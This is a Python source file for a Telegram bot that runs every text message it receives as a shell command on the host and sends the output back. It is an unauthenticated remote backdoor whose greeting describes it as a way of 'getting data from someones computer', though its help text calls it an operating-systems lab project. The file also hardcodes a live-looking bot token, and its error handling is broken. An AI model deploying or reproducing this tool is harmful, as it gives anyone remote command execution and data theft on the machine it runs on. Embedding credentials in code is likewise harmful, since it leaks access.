import subprocess

import logging

from telegram import ForceReply, Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
# set higher logging level for httpx to avoid all GET and POST requests being logged
logging.getLogger("httpx").setLevel(logging.WARNING)

logger = logging.getLogger(__name__)


# Define a few command handlers. These usually take the two arguments update and
# context.
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a message when the command /start is issued."""
    user = update.effective_user
    await update.message.reply_html(
        rf"Hi {user.mention_html()}! I guess you are interested in getting data from someones computer! Enter your command!",
        reply_markup=ForceReply(selective=True),
    )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a message when the command /help is issued."""
    await update.message.reply_text(
        "This bot is specifically made for Operating Systems Lab Project.\n"
        "Go away!"
    )


async def execute(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # get the user's command from the text
    command = update.message.text
    try:
        result = subprocess.run(
                command,
                shell=True,
                text=True, 
                check=True,
                capture_output=True
            )
    except:
        print("Error occured in runing the command")

    if result.stderr:
        print("1")
        await update.message.reply_text(result.stderr)
    elif result.stdout:
        print("2")
        await update.message.reply_text(result.stdout)
    else:
        print("3")
        await update.message.reply_text("command executed!")
        


def main() -> None:
    """Start the bot."""
    TOKEN = "6938661186:AAFIYI6f-sm9sChZ_KJdxJnRlkmtqCh0jXA"
    application = Application.builder().token(TOKEN).build()

    # on different commands - answer in Telegram
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))

    # on non command i.e message - echo the message on Telegram
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, execute))

    # Run the bot until the user presses Ctrl-C
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()